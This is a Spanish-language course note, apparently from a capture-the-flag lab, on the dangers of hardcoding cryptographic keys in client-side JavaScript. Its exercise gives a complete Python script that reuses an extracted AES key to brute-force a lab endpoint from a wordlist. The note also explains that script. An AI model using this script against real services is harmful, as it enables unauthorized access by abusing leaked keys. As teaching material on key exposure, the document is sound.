---
layout: apunte
title: "3. Exposed Keys"
---

<h2>Riesgos de Exponer Claves Criptográficas en el Código del Lado del Cliente</h2>
Exponer claves criptográficas del lado del cliente es un error tan común como crítico. Cuando las claves se incluyen en código que corre en el navegador del usuario, cualquiera con acceso a la aplicación puede recuperar esas claves. Esto derrota el propósito de la encriptación y autentificación, ya que el atacante gana acceso directo al mecanismo que pretende proteger la información.

**Riesgos Clave**

1. **Acceso no Autorizado:** Las claves expuestas pueden ser usadas para desencriptar información sensible o interactuar con las APIs del backend como usuario autentificado.
2. **Manipulación de Información:** Un atacante puede usar las claves para generar payloads firmados o modificar mensajes encriptados, sobrepasando comprobaciones de integridad.
3. **Abuso de API:** Las claves de API hardcodeadas pueden permitir a un atacante a acceder a endpoints de API privilegiados sin autorización.

------------------------------------------
<h2>Escenarios Comunes de Exposición de Claves</h2>

1. **Claves API Hardcodeadas en JavaScript:** Los desarrolladores a veces incrustan claves API en el frontend por comodidad olvidando que cualquiera puede ver ese código usando las herramientas de desarrollador del navegador.
2. **Claves de Encriptación enFframeworks del Lado del Cliente:** Las claves de encriptación son a veces incluidas en las librerías del frontend para encriptar/desencriptar información localmente. Estas claves pueden ser fácilmente extraídas y usadas maliciosamente.
3. **Archivos de Configuración no Securizados:** Los archivos de configuración incrustados en las aplicaciones web pueden contener credenciales sensibles o claves en texto plano.

---------------------------------------
<h2>Ejercicio</h2>
Navega a http://bcts.thm/labs/lab3.

!**Pasted image 20260311213518.png|376**

Abre las herramientas de desarrollador (F12).

!**Pasted image 20260311213536.png|683**

Como puedes ver en la imagen, la información subida es encriptada usando el parámetro "data" como se ve en la petición. Al comprobar el código fuente de la web vemos que la aplicación usa JavaScript para encriptar el mensaje subido antes de subirlo a `process.php`.

!**Pasted image 20260311213700.png|456**

Como la clave de encriptación usada para encriptar el mensaje está hardcodeado en el código JavaScript, es posible para un atacante crear un script que hará fuerza bruta para encontrar el mensaje usando dicha clave.

Para simplificar esto, esta es una wordlist que contiene los mensajes posibles y está disponible en http://bcts.thm/labs/lab3/wordlist.txt:

!**Pasted image 20260311213849.png|295**

Sin embargo, hacer fuerza bruta a la aplicación no funcionará porque la petición está encriptada, por lo que debemos automatizar esto usando Python.

Debajo está el script de Python que usa las palabras disponibles en `wordlist.txt`.

```python
import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Configuration
url = "http://bcts.thm/labs/lab3/process.php"
encryption_key = b"1234567890123456"  # Must be 16 bytes (same as in the JavaScript)
wordlist_path = "wordlist.txt"        # Path to the wordlist

# Function to encrypt a message
def encrypt_message(message, iv):
    # Pad the message to a multiple of the block size (16 bytes for AES)
    padded_message = pad(message.encode(), AES.block_size)
    # Encrypt using AES-CBC
    cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded_message)
    # Encode ciphertext and IV in Base64 for transmission
    return base64.b64encode(ciphertext).decode(), base64.b64encode(iv).decode()

# Function to send the payload
def send_payload(ciphertext, iv):
    payload = {"data": ciphertext, "iv": iv}
    response = requests.post(url, json=payload)
    return response.text

# Main bruteforce function
def bruteforce():
    with open(wordlist_path, "r") as f:
        words = f.readlines()

    for word in words:
        word = word.strip()
        print(f"Trying: {word}")
        # Generate a random IV (16 bytes)
        iv = AES.get_random_bytes(16)
        # Encrypt the current word
        ciphertext, iv_base64 = encrypt_message(word, iv)
        # Send the payload to the server
        response = send_payload(ciphertext, iv_base64)
        print(f"Response: {response}")
        # Check if the response indicates success
        if "Access granted!" in response:
            print(f"[+] Found the correct message: {word}")
            break

if __name__ == "__main__":
    bruteforce()
```

<h3>Desglose del Código</h3>
<h4>Setup del Script</h4>
- **url:** El script interactúa con `https://bcts.thm/labs/lab3/process.php`, donde se manda el mensaje.
- **wordlist_path:** El archivo que contiene las palabras potenciales en texto plano usadas para la fuerza bruta.

<h4>Clave de Encriptación</h4>
- **encryption_key:** La clave de encriptación AES está hardcodeada como `b"1234567890123456"`.

<h4>Funciones</h4>
1. **encrypt_message(message, iv):** 
	- Encripta un mensaje dado usando el modo AES-CBC.
	- Ajusta el mensaje para asegurar que su longitud sea un múltiplo del tamaño de bloque AES (16 bytes).
	- Encripta el mensaje ajustado usando AES con el IV dado.
	- Convierte el ciphertext y IV a base64 antes de devolverlo.
2. **send_payload(ciphertext, iv):** 
	- Manda el mensaje encriptado y IV como payload JSON al servidor de destino.
	- Devuelve la respuesta del servidor.
3. **bruteforce():** 
	- Lee la wordlist.
	- Itera sobre cada palabra de la lista:
		- Genera un IV random (16 bytes).
		- Encripta la palabra usando AES-CBC.
		- Manda el mensaje encriptado al servidor.
		- Comprueba si la respuesta contiene `"Access granted!"`.

<h4>Manejo de Respuesta</h4>
- Si la respuesta contiene `"Access granted!"`, se encuentra el texto plano correcto y el script se para.
- Si no, procede a la siguiente palabra en la lista.


Una vez que el script bruteforcee el mensaje correcto, la aplicación devolverá la flag.

IMAGEN

